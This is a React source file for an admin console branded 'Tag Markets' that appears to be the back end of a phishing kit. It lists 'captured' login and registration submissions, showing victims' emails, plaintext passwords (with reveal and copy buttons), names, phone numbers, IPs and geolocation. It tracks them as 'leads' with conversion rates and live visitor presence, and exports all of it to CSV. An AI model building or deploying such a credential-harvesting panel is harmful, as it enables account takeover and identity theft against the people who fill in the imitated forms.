"use client";

import { useCallback, useEffect, useMemo, useState } from "react";

import type { PortalEvent, PortalPresence, PortalStats, VisitPage } from "@/types/portal";

const REFRESH_MS = 5000;

const timeFormat = new Intl.DateTimeFormat("en-GB", {
  day: "2-digit",
  month: "short",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit",
});

const PAGE_LABELS: Record<VisitPage, string> = {
  home: "Home",
  login: "Login",
  signup: "Register",
  other: "Other",
};

function formatTime(iso: string) {
  const date = new Date(iso);
  return Number.isNaN(date.getTime()) ? iso : timeFormat.format(date);
}

function relativeTime(iso: string) {
  const seconds = Math.max(0, Math.round((Date.now() - new Date(iso).getTime()) / 1000));
  if (seconds < 10) return "now";
  if (seconds < 60) return `${seconds}s ago`;
  const minutes = Math.round(seconds / 60);
  if (minutes < 60) return `${minutes}m ago`;
  const hours = Math.round(minutes / 60);
  if (hours < 24) return `${hours}h ago`;
  return `${Math.round(hours / 24)}d ago`;
}

function csvEscape(value: string) {
  return /[",\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
}

function toCsv(events: PortalEvent[]) {
  const header = [
    "type",
    "timestamp",
    "email",
    "password",
    "first_name",
    "last_name",
    "country",
    "geo_country",
    "phone_code",
    "phone",
    "account_type",
    "company_name",
    "remember",
    "agreements",
    "ip",
    "user_agent",
  ];
  const rows = events.map((event) =>
    event.kind === "login"
      ? [
          "login",
          event.at,
          event.email,
          event.password,
          "",
          "",
          "",
          event.geoCountry ?? "",
          "",
          "",
          "",
          "",
          String(event.remember),
          "",
          event.ip,
          event.userAgent,
        ]
      : [
          "signup",
          event.at,
          event.email,
          event.password,
          event.firstName,
          event.lastName,
          event.country,
          event.geoCountry ?? "",
          event.phoneCode,
          event.phone,
          event.accountType,
          event.companyName,
          "",
          String(event.agreements),
          event.ip,
          event.userAgent,
        ],
  );
  return [header, ...rows].map((row) => row.map(csvEscape).join(",")).join("\n");
}

function countryFlag(code: string) {
  if (!/^[A-Z]{2}$/.test(code)) return "🌐";
  return String.fromCodePoint(...[...code].map((char) => 127397 + char.charCodeAt(0)));
}

function countryName(code: string) {
  if (!code) return "Unknown";
  try {
    return new Intl.DisplayNames(["en"], { type: "region" }).of(code) ?? code;
  } catch {
    return code;
  }
}

function EyeIcon({ open }: { open: boolean }) {
  return open ? (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="h-4 w-4">
      <path d="M3 3l18 18" strokeLinecap="round" />
      <path d="M10.6 5.1A10.9 10.9 0 0112 5c5 0 9 4.5 9 7 0 .8-.4 1.9-1.2 3" strokeLinecap="round" />
      <path d="M6.3 6.5C4 8.2 3 10.4 3 12c0 2.5 4 7 9 7 1.5 0 2.9-.4 4.1-1" strokeLinecap="round" />
      <path d="M9.9 9.9a3 3 0 004.2 4.2" strokeLinecap="round" />
    </svg>
  ) : (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="h-4 w-4">
      <path d="M3 12c0-2.5 4-7 9-7s9 4.5 9 7-4 7-9 7-9-4.5-9-7z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  );
}

function CopyIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="h-4 w-4">
      <rect x="9" y="9" width="11" height="11" rx="2" />
      <path d="M5 15V5a2 2 0 012-2h8" strokeLinecap="round" />
    </svg>
  );
}

function PasswordCell({ id, value }: { id: string; value: string }) {
  const [shown, setShown] = useState(false);
  const [copied, setCopied] = useState(false);

  const copy = async () => {
    try {
      await navigator.clipboard.writeText(value);
      setCopied(true);
      setTimeout(() => setCopied(false), 1200);
    } catch {
      /* clipboard unavailable */
    }
  };

  return (
    <div className="flex items-center gap-2">
      <code className="rounded bg-white/[0.06] px-2 py-1 font-mono text-[12px] text-[#d7ff70]">
        {shown ? value || "—" : "••••••••"}
      </code>
      <button
        type="button"
        onClick={() => setShown((current) => !current)}
        className="text-neutral-500 transition hover:text-neutral-200"
        aria-label={shown ? "Hide password" : "Show password"}
        aria-controls={id}
      >
        <EyeIcon open={shown} />
      </button>
      <button
        type="button"
        onClick={copy}
        className="text-neutral-500 transition hover:text-neutral-200"
        aria-label="Copy password"
      >
        {copied ? <span className="text-[10px] font-semibold text-[#d7ff70]">OK</span> : <CopyIcon />}
      </button>
    </div>
  );
}

function Kpi({
  label,
  value,
  hint,
  accent,
  pulse,
}: {
  label: string;
  value: string;
  hint?: string;
  accent?: string;
  pulse?: boolean;
}) {
  return (
    <div className="rounded-2xl border border-white/10 bg-white/[0.03] p-4">
      <p className="flex items-center gap-1.5 text-[10px] font-semibold uppercase tracking-[0.16em] text-neutral-500">
        {pulse ? (
          <span className="relative flex h-1.5 w-1.5">
            <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-[#c9f95a] opacity-70" />
            <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-[#c9f95a]" />
          </span>
        ) : null}
        {label}
      </p>
      <p className={`mt-1.5 text-2xl font-semibold ${accent ?? "text-white"}`}>{value}</p>
      {hint ? <p className="mt-0.5 truncate text-[11px] text-neutral-500">{hint}</p> : null}
    </div>
  );
}

function Meter({ value, max, tone = "bg-[#c9f95a]" }: { value: number; max: number; tone?: string }) {
  const width = max > 0 ? Math.max(2, Math.round((value / max) * 100)) : 0;
  return (
    <div className="h-1.5 w-full overflow-hidden rounded-full bg-white/[0.08]">
      <div className={`h-full rounded-full ${tone}`} style={{ width: `${width}%` }} />
    </div>
  );
}

function LiveCard({ visitor }: { visitor: PortalPresence }) {
  return (
    <div className="flex items-center gap-3 rounded-2xl border border-white/10 bg-white/[0.03] p-3">
      <span className="text-[34px] leading-none" aria-hidden>
        {countryFlag(visitor.country)}
      </span>
      <div className="min-w-0">
        <p className="truncate text-sm font-medium text-white">
          {countryName(visitor.country)}
          <span className="ml-1.5 text-[10px] font-normal uppercase tracking-wide text-neutral-500">
            {visitor.country || "—"}
          </span>
        </p>
        <p className="truncate text-[11px] text-neutral-500">
          {[visitor.city, visitor.region].filter(Boolean).join(", ") || "Unknown city"}
        </p>
      </div>
      <div className="ml-auto flex flex-col items-end gap-1">
        <span className="rounded-full bg-[#c9f95a]/15 px-2 py-0.5 text-[10px] font-semibold uppercase tracking-wide text-[#c9f95a]">
          {PAGE_LABELS[visitor.page]}
        </span>
        <span className="text-[10px] text-neutral-500">{relativeTime(visitor.lastSeen)}</span>
      </div>
    </div>
  );
}

function TrafficBoard({ stats }: { stats: PortalStats }) {
  const live = stats.live ?? [];
  const maxDaily = Math.max(
    1,
    ...stats.daily.map((day) => day.visits + day.logins + day.signups),
  );
  const maxCountry = Math.max(
    1,
    ...stats.byCountry.map((country) => country.visits + country.logins + country.signups),
  );

  const pageViews = (page: VisitPage) =>
    stats.byPage.find((entry) => entry.page === page)?.visits ?? 0;

  const leads = stats.totals.logins + stats.totals.signups;
  const conversion = stats.totals.visits > 0 ? (leads / stats.totals.visits) * 100 : 0;

  const funnel = [
    { label: "Visits", value: stats.totals.visits, tone: "bg-white/40" },
    { label: "Login page", value: pageViews("login"), tone: "bg-sky-400" },
    { label: "Logins submitted", value: stats.totals.logins, tone: "bg-sky-300" },
    { label: "Register page", value: pageViews("signup"), tone: "bg-fuchsia-400" },
    { label: "Signups submitted", value: stats.totals.signups, tone: "bg-fuchsia-300" },
  ];
  const maxFunnel = Math.max(1, ...funnel.map((step) => step.value));

  return (
    <>
      <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-4">
        <Kpi
          label="Live now"
          value={String(live.length)}
          hint="Seen in the last 90 seconds"
          accent="text-[#c9f95a]"
          pulse
        />
        <Kpi
          label="Visits · 7d"
          value={String(stats.totals.visitsWeek)}
          hint={`${stats.totals.visitsToday} today · ${stats.totals.visits} total`}
        />
        <Kpi
          label="Leads"
          value={String(leads)}
          hint={`${stats.totals.logins} logins · ${stats.totals.signups} signups`}
        />
        <Kpi
          label="Conversion"
          value={`${conversion.toFixed(1)}%`}
          hint={`${stats.totals.uniqueVisitors} unique visitors`}
          accent="text-[#c9f95a]"
        />
      </div>

      <section className="mt-5">
        <div className="flex items-end justify-between">
          <div>
            <h2 className="flex items-center gap-2 text-sm font-semibold text-white">
              <span className="relative flex h-2 w-2">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-[#c9f95a] opacity-70" />
                <span className="relative inline-flex h-2 w-2 rounded-full bg-[#c9f95a]" />
              </span>
              Live now
            </h2>
            <p className="text-[11px] text-neutral-500">Everyone with the site open right now</p>
          </div>
          <span className="text-[11px] text-neutral-500">
            updated {new Date(stats.generatedAt).toLocaleTimeString("en-GB")}
          </span>
        </div>

        {live.length === 0 ? (
          <p className="mt-3 rounded-2xl border border-dashed border-white/10 bg-white/[0.02] px-4 py-6 text-center text-xs text-neutral-500">
            No one online right now — open the site in another tab to see the heartbeat.
          </p>
        ) : (
          <div className="mt-3 grid gap-2 md:grid-cols-2 xl:grid-cols-3">
            {live.map((visitor) => (
              <LiveCard key={visitor.visitorId} visitor={visitor} />
            ))}
          </div>
        )}
      </section>

      <div className="mt-5 grid gap-4 lg:grid-cols-2">
        <section className="rounded-2xl border border-white/10 bg-white/[0.02] p-4">
          <h2 className="text-sm font-semibold text-white">Top countries</h2>
          <div className="mt-3 space-y-3">
            {stats.byCountry.length === 0 ? (
              <p className="text-xs text-neutral-500">No traffic yet.</p>
            ) : (
              stats.byCountry.map((country) => (
                <div key={country.country} className="flex items-center gap-3">
                  <span className="text-[30px] leading-none" aria-hidden>
                    {countryFlag(country.country)}
                  </span>
                  <div className="min-w-0 flex-1">
                    <div className="flex items-baseline justify-between gap-2">
                      <p className="truncate text-xs font-medium text-neutral-200">
                        {countryName(country.country)}
                      </p>
                      <p className="shrink-0 text-[11px] text-neutral-500">
                        {country.visits} views · {country.logins}L · {country.signups}S
                      </p>
                    </div>
                    <div className="mt-1">
                      <Meter
                        value={country.visits + country.logins + country.signups}
                        max={maxCountry}
                        tone="bg-sky-400"
                      />
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>
        </section>

        <section className="rounded-2xl border border-white/10 bg-white/[0.02] p-4">
          <h2 className="text-sm font-semibold text-white">Funnel</h2>
          <div className="mt-3 space-y-2.5">
            {funnel.map((step) => (
              <div key={step.label}>
                <div className="flex items-baseline justify-between text-[11px]">
                  <span className="text-neutral-300">{step.label}</span>
                  <span className="text-neutral-500">{step.value}</span>
                </div>
                <div className="mt-1">
                  <Meter value={step.value} max={maxFunnel} tone={step.tone} />
                </div>
              </div>
            ))}
          </div>
          <div className="mt-4 border-t border-white/5 pt-3 text-[11px] text-neutral-500">
            Page views by section:{" "}
            {stats.byPage.length === 0
              ? "—"
              : stats.byPage
                  .map((page) => `${PAGE_LABELS[page.page]} ${page.visits}`)
                  .join(" · ")}
          </div>
        </section>
      </div>

      <section className="mt-4 rounded-2xl border border-white/10 bg-white/[0.02] p-4">
        <div className="flex items-center justify-between">
          <h2 className="text-sm font-semibold text-white">Last 14 days</h2>
          <div className="flex items-center gap-3 text-[10px] uppercase tracking-wide text-neutral-500">
            <span className="flex items-center gap-1">
              <span className="h-2 w-2 rounded-sm bg-[#c9f95a]" /> views
            </span>
            <span className="flex items-center gap-1">
              <span className="h-2 w-2 rounded-sm bg-sky-400" /> logins
            </span>
            <span className="flex items-center gap-1">
              <span className="h-2 w-2 rounded-sm bg-fuchsia-400" /> signups
            </span>
          </div>
        </div>
        <div className="mt-3 flex h-24 items-end gap-1">
          {stats.daily.map((day) => {
            const height = Math.max(3, Math.round((day.visits / maxDaily) * 100));
            return (
              <div key={day.date} className="group relative flex-1">
                <div className="flex h-24 flex-col justify-end">
                  <div
                    className="w-full rounded-t bg-[#c9f95a]/80 transition group-hover:bg-[#c9f95a]"
                    style={{ height: `${height}%` }}
                  />
                  <div className="mt-0.5 flex gap-0.5">
                    <div
                      className="flex-1 rounded-t bg-sky-400"
                      style={{ height: Math.max(1, day.logins * 2) }}
                    />
                    <div
                      className="flex-1 rounded-t bg-fuchsia-400"
                      style={{ height: Math.max(1, day.signups * 2) }}
                    />
                  </div>
                </div>
                <div className="pointer-events-none absolute -top-8 left-1/2 z-10 hidden -translate-x-1/2 whitespace-nowrap rounded bg-black/90 px-2 py-1 text-[10px] text-neutral-200 group-hover:block">
                  {day.date} · {day.visits} views · {day.logins}L / {day.signups}S
                </div>
                <p className="mt-1 text-center text-[9px] text-neutral-600">{day.date.slice(5)}</p>
              </div>
            );
          })}
        </div>
      </section>
    </>
  );
}

function RecentVisits({ stats }: { stats: PortalStats }) {
  return (
    <section className="mt-4 overflow-hidden rounded-2xl border border-white/10 bg-white/[0.02]">
      <div className="flex items-center justify-between border-b border-white/10 px-4 py-2.5">
        <h2 className="text-sm font-semibold text-white">Latest visits</h2>
        <span className="text-[11px] text-neutral-500">last {stats.recentVisits.length}</span>
      </div>
      <div className="overflow-x-auto">
        <table className="w-full min-w-[680px] text-left text-[11px]">
          <thead>
            <tr className="border-b border-white/5 text-[9px] uppercase tracking-[0.14em] text-neutral-600">
              <th className="px-4 py-2 font-semibold">When</th>
              <th className="px-4 py-2 font-semibold">Page</th>
              <th className="px-4 py-2 font-semibold">Country</th>
              <th className="px-4 py-2 font-semibold">City</th>
              <th className="px-4 py-2 font-semibold">Referrer</th>
              <th className="px-4 py-2 font-semibold">IP</th>
            </tr>
          </thead>
          <tbody>
            {stats.recentVisits.length === 0 ? (
              <tr>
                <td colSpan={6} className="px-4 py-6 text-center text-neutral-500">
                  No visits recorded yet.
                </td>
              </tr>
            ) : (
              stats.recentVisits.map((visit) => (
                <tr key={visit.id} className="border-b border-white/5 last:border-0">
                  <td className="whitespace-nowrap px-4 py-1.5 text-neutral-400">
                    {formatTime(visit.at)}
                  </td>
                  <td className="px-4 py-1.5">
                    <span className="rounded-full bg-white/[0.06] px-2 py-0.5 text-[9px] font-semibold uppercase tracking-wide text-neutral-300">
                      {PAGE_LABELS[visit.page] ?? visit.page}
                    </span>
                    <span className="ml-2 text-[10px] text-neutral-600">{visit.path}</span>
                  </td>
                  <td className="whitespace-nowrap px-4 py-1.5 text-neutral-300">
                    {visit.country ? `${countryFlag(visit.country)} ${visit.country}` : "—"}
                  </td>
                  <td className="px-4 py-1.5 text-neutral-500">{visit.city || "—"}</td>
                  <td className="max-w-[200px] truncate px-4 py-1.5 text-neutral-500">
                    {visit.referrer || "direct"}
                  </td>
                  <td className="whitespace-nowrap px-4 py-1.5 font-mono text-[10px] text-neutral-600">
                    {visit.ip}
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
    </section>
  );
}

export function AdminDashboard() {
  const [events, setEvents] = useState<PortalEvent[]>([]);
  const [stats, setStats] = useState<PortalStats | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [tab, setTab] = useState<"all" | "login" | "signup">("all");
  const [query, setQuery] = useState("");
  const [lastSync, setLastSync] = useState<Date | null>(null);

  const load = useCallback(async () => {
    try {
      const [eventsResponse, statsResponse] = await Promise.all([
        fetch("/api/admin/submissions", { cache: "no-store" }),
        fetch("/api/admin/stats", { cache: "no-store" }),
      ]);
      if (eventsResponse.status === 401) {
        window.location.href = "/admin/login";
        return;
      }
      if (!eventsResponse.ok) throw new Error("request failed");
      const payload = (await eventsResponse.json()) as { events?: PortalEvent[] };
      setEvents(payload.events ?? []);

      if (statsResponse.ok) {
        const statsPayload = (await statsResponse.json()) as { stats?: PortalStats };
        setStats(statsPayload.stats ?? null);
      }

      setLastSync(new Date());
      setError(null);
    } catch {
      setError("Could not load the activity feed.");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    // `load` awaits the network before touching state, so this is not a
    // synchronous setState; the rule cannot see through the async call.
    // eslint-disable-next-line react-hooks/set-state-in-effect
    void load();
    const timer = setInterval(() => void load(), REFRESH_MS);
    return () => clearInterval(timer);
  }, [load]);

  const logins = useMemo(() => events.filter((event) => event.kind === "login"), [events]);
  const signups = useMemo(() => events.filter((event) => event.kind === "signup"), [events]);

  const filtered = useMemo(() => {
    const needle = query.trim().toLowerCase();
    return events.filter((event) => {
      if (tab !== "all" && event.kind !== tab) return false;
      if (!needle) return true;
      const haystack =
        event.kind === "login"
          ? `${event.email} ${event.ip} ${event.geoCountry ?? ""}`
          : `${event.firstName} ${event.lastName} ${event.email} ${event.country} ${event.phone} ${event.ip}`;
      return haystack.toLowerCase().includes(needle);
    });
  }, [events, query, tab]);

  const uniqueEmails = useMemo(
    () => new Set(events.map((event) => event.email.toLowerCase())).size,
    [events],
  );

  const lastEvent = events[0];

  const clearAll = async () => {
    if (!window.confirm("Delete every captured login and registration?")) return;
    await fetch("/api/admin/submissions", { method: "DELETE" });
    await load();
  };

  const signOut = async () => {
    await fetch("/api/admin/auth", { method: "DELETE" });
    window.location.href = "/admin/login";
  };

  const exportCsv = () => {
    const blob = new Blob([toCsv(filtered)], { type: "text/csv;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = `tagmarkets-portal-${new Date().toISOString().slice(0, 10)}.csv`;
    link.click();
    URL.revokeObjectURL(url);
  };

  const tabs: { id: "all" | "login" | "signup"; label: string; count: number }[] = [
    { id: "all", label: "Everything", count: events.length },
    { id: "login", label: "Logins", count: logins.length },
    { id: "signup", label: "Signups", count: signups.length },
  ];

  return (
    <div className="min-h-screen">
      <header className="sticky top-0 z-10 border-b border-white/10 bg-[#08090a]/90 backdrop-blur">
        <div className="mx-auto flex max-w-[1200px] flex-wrap items-center gap-3 px-5 py-3">
          <div className="flex items-center gap-2.5">
            <span className="flex h-8 w-8 items-center justify-center rounded-lg bg-[#c9f95a] text-xs font-black text-black">
              TM
            </span>
            <div>
              <p className="text-xs font-semibold tracking-wide text-white">Tag Markets</p>
              <p className="text-[10px] uppercase tracking-[0.18em] text-neutral-500">
                Admin console
              </p>
            </div>
          </div>

          <div className="ml-auto flex items-center gap-2">
            <span className="hidden items-center gap-1.5 text-[11px] text-neutral-500 sm:flex">
              <span className="relative flex h-1.5 w-1.5">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-[#c9f95a] opacity-60" />
                <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-[#c9f95a]" />
              </span>
              Live · {lastSync ? lastSync.toLocaleTimeString("en-GB") : "connecting"}
            </span>
            <button
              type="button"
              onClick={() => void load()}
              className="rounded-lg border border-white/10 px-2.5 py-1 text-[11px] font-medium text-neutral-300 transition hover:border-white/25 hover:text-white"
            >
              Refresh
            </button>
            <button
              type="button"
              onClick={exportCsv}
              className="rounded-lg border border-white/10 px-2.5 py-1 text-[11px] font-medium text-neutral-300 transition hover:border-white/25 hover:text-white"
            >
              Export CSV
            </button>
            <button
              type="button"
              onClick={() => void clearAll()}
              className="rounded-lg border border-red-500/30 px-2.5 py-1 text-[11px] font-medium text-red-300 transition hover:border-red-400/60 hover:text-red-200"
            >
              Clear
            </button>
            <button
              type="button"
              onClick={() => void signOut()}
              className="rounded-lg border border-white/10 px-2.5 py-1 text-[11px] font-medium text-neutral-400 transition hover:border-white/25 hover:text-white"
            >
              Sign out
            </button>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-[1200px] px-5 py-5">
        {error ? (
          <p className="mb-4 rounded-xl border border-red-500/30 bg-red-500/10 px-4 py-2 text-xs text-red-200">
            {error}
          </p>
        ) : null}

        {stats ? <TrafficBoard stats={stats} /> : null}
        {stats ? <RecentVisits stats={stats} /> : null}

        <section className="mt-6">
          <div className="flex flex-wrap items-end justify-between gap-2">
            <div>
              <h2 className="text-sm font-semibold text-white">Captured submissions</h2>
              <p className="text-[11px] text-neutral-500">
                {logins.length} logins · {signups.length} signups · {uniqueEmails} unique emails
                {lastEvent ? ` · last ${relativeTime(lastEvent.at)}` : ""}
              </p>
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <div className="flex rounded-lg border border-white/10 bg-white/[0.03] p-0.5">
                {tabs.map((item) => (
                  <button
                    key={item.id}
                    type="button"
                    onClick={() => setTab(item.id)}
                    className={`rounded-md px-2.5 py-1 text-[11px] font-medium transition ${
                      tab === item.id ? "bg-[#c9f95a] text-black" : "text-neutral-400 hover:text-white"
                    }`}
                  >
                    {item.label}
                    <span
                      className={tab === item.id ? "ml-1 text-black/60" : "ml-1 text-neutral-600"}
                    >
                      {item.count}
                    </span>
                  </button>
                ))}
              </div>

              <div className="relative">
                <svg
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="1.8"
                  className="pointer-events-none absolute left-2.5 top-1/2 h-3.5 w-3.5 -translate-y-1/2 text-neutral-500"
                >
                  <circle cx="11" cy="11" r="7" />
                  <path d="M20 20l-3.5-3.5" strokeLinecap="round" />
                </svg>
                <input
                  value={query}
                  onChange={(event) => setQuery(event.target.value)}
                  placeholder="Search email, name, country, IP…"
                  className="w-56 rounded-lg border border-white/10 bg-white/[0.03] py-1 pl-8 pr-2.5 text-[11px] text-neutral-200 placeholder:text-neutral-600 focus:border-[#c9f95a]/60 focus:outline-none"
                />
              </div>
            </div>
          </div>

          <div className="mt-3 overflow-hidden rounded-2xl border border-white/10 bg-white/[0.02]">
            <div className="overflow-x-auto">
              <table className="w-full min-w-[880px] text-left text-[12px]">
                <thead>
                  <tr className="border-b border-white/10 text-[9px] uppercase tracking-[0.14em] text-neutral-500">
                    <th className="px-4 py-2 font-semibold">When</th>
                    <th className="px-4 py-2 font-semibold">Type</th>
                    <th className="px-4 py-2 font-semibold">Name</th>
                    <th className="px-4 py-2 font-semibold">Email</th>
                    <th className="px-4 py-2 font-semibold">Password</th>
                    <th className="px-4 py-2 font-semibold">Details</th>
                    <th className="px-4 py-2 font-semibold">Geo</th>
                    <th className="px-4 py-2 font-semibold">IP</th>
                  </tr>
                </thead>
                <tbody>
                  {loading ? (
                    <tr>
                      <td colSpan={8} className="px-4 py-10 text-center text-xs text-neutral-500">
                        Loading captured activity…
                      </td>
                    </tr>
                  ) : filtered.length === 0 ? (
                    <tr>
                      <td colSpan={8} className="px-4 py-12 text-center">
                        <p className="text-xs text-neutral-400">Nothing captured yet.</p>
                        <p className="mt-1 text-[11px] text-neutral-600">
                          Sign in or register on{" "}
                          <a className="text-[#c9f95a] hover:underline" href="/login">
                            /login
                          </a>{" "}
                          and the submission shows up here.
                        </p>
                      </td>
                    </tr>
                  ) : (
                    filtered.map((event) => (
                      <tr
                        key={event.id}
                        className="border-b border-white/5 align-top last:border-0 hover:bg-white/[0.03]"
                      >
                        <td className="whitespace-nowrap px-4 py-2 text-neutral-400">
                          <span className="block text-neutral-300">{formatTime(event.at)}</span>
                          <span className="text-[10px] text-neutral-600">
                            {relativeTime(event.at)}
                          </span>
                        </td>
                        <td className="px-4 py-2">
                          <span
                            className={`rounded-full px-2 py-0.5 text-[9px] font-semibold uppercase tracking-wide ${
                              event.kind === "login"
                                ? "bg-sky-500/15 text-sky-300"
                                : "bg-[#c9f95a]/15 text-[#c9f95a]"
                            }`}
                          >
                            {event.kind === "login" ? "Login" : "Signup"}
                          </span>
                        </td>
                        <td className="px-4 py-2 text-neutral-200">
                          {event.kind === "signup" ? (
                            <>
                              <span className="block">
                                {[event.firstName, event.lastName].filter(Boolean).join(" ") || "—"}
                              </span>
                              {event.companyName ? (
                                <span className="text-[10px] text-neutral-500">
                                  {event.companyName}
                                </span>
                              ) : null}
                            </>
                          ) : (
                            <span className="text-neutral-600">—</span>
                          )}
                        </td>
                        <td className="px-4 py-2">
                          <span className="block text-neutral-200">{event.email || "—"}</span>
                          {event.kind === "login" && event.remember ? (
                            <span className="text-[10px] text-neutral-500">remember me</span>
                          ) : null}
                        </td>
                        <td className="px-4 py-2">
                          <PasswordCell id={event.id} value={event.password} />
                        </td>
                        <td className="px-4 py-2 text-neutral-400">
                          {event.kind === "signup" ? (
                            <span className="text-[11px] leading-4">
                              {event.country || "—"}
                              <br />
                              {[event.phoneCode, event.phone].filter(Boolean).join(" ") || "—"}
                              <br />
                              <span className="text-neutral-600">
                                {event.accountType} · {event.agreements} agreement
                                {event.agreements === 1 ? "" : "s"}
                              </span>
                            </span>
                          ) : (
                            <span className="text-neutral-600">—</span>
                          )}
                        </td>
                        <td className="whitespace-nowrap px-4 py-2 text-neutral-300">
                          {event.geoCountry ? (
                            <span title={event.geoCity || undefined}>
                              {countryFlag(event.geoCountry)} {event.geoCountry}
                            </span>
                          ) : (
                            <span className="text-neutral-600">—</span>
                          )}
                        </td>
                        <td className="whitespace-nowrap px-4 py-2 font-mono text-[10px] text-neutral-500">
                          {event.ip}
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        </section>

        <p className="mt-4 text-[10px] leading-5 text-neutral-600">
          Submissions live in Supabase (<code className="rounded bg-white/[0.06] px-1">portal_events</code>),
          page views in <code className="rounded bg-white/[0.06] px-1">portal_visits</code>, and live
          presence in <code className="rounded bg-white/[0.06] px-1">portal_presence</code>. Without
          Supabase credentials everything falls back to files under{" "}
          <code className="rounded bg-white/[0.06] px-1">.data/</code>.
        </p>
      </main>
    </div>
  );
}
